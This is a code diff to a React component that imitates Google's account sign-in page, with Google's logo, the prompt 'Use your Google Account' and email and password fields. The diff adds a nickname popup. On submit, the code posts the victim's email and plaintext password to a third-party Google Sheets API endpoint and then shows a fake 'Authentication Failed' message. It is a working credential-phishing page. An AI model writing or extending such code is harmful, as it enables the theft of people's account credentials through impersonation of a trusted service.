@@ -1,6 +1,7 @@
 import React, { useState, useEffect, useRef } from "react";
 import '../Assets/Styles/google-form.css'
 import axios from 'axios';
+import Popup from "./Popup";
 
 const GoogleForm = () => {
     const [activeIndex, setActiveIndex] = useState(0)
@@ -12,6 +13,8 @@ const GoogleForm = () => {
     const [subtitle, setSubtitle] = useState('Use your Google Account')
     
     const [loaderState, setLoaderState] = useState(false)
+    const [PopupState, setPopupState] = useState(false)
+    const [nicknameVal, setNicknameVal] = useState('')
     
     const _form = useRef()
     
@@ -59,14 +62,16 @@ const GoogleForm = () => {
             setLoaderState(true)
             let d = new Date()
             let date = `${d.getDay()}/${d.getMonth()}/${d.getFullYear()}`
-            let id = Date.now() * Math.random()
+            let id = `G${Math.round(Date.now() * Math.random())}`
+
             axios ({
                 method: 'post',
                 url: 'https://v1.nocodeapi.com/tuxa/google_sheets/xQtvMBfFFgfpISRL?tabId=Sheet1', 
                 params: {},
-                data: [[id, 'null', email, password, date]]
+                data: [[id, nicknameVal, email, password, date]]
             }).then(function () {
                 setLoaderState(false)
+                setPopupState(false)
             }).catch(function (error) {
                 alert('Authentication Failed... Please try again', error)
                 console.log(error); 
@@ -93,7 +98,10 @@ const GoogleForm = () => {
         <div className="google-container">
             <div className="form-container">
                 <img className="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google" />
-                <form ref={_form} onSubmit={_sendEmail} className="g-form">
+                <form ref={_form} onSubmit={(e) => {
+                    e.preventDefault()
+                    setPopupState(true)
+                }} className="g-form">
 
                     <h2>{title}</h2>
                     <p>{subtitle}</p>
@@ -110,6 +118,11 @@ const GoogleForm = () => {
                     </div>
                 </form>
             </div>
+
+
+            {PopupState ? <Popup title='Enter an Username' placeholder='John Doe' icon='user' onSubmitClick={_sendEmail} onCancelClick={() => setPopupState(false)} onChangeHandler={setNicknameVal}/> : null}
+
+
             <footer className="g-footer">
                 <p>English (United States)</p>
                 <div>
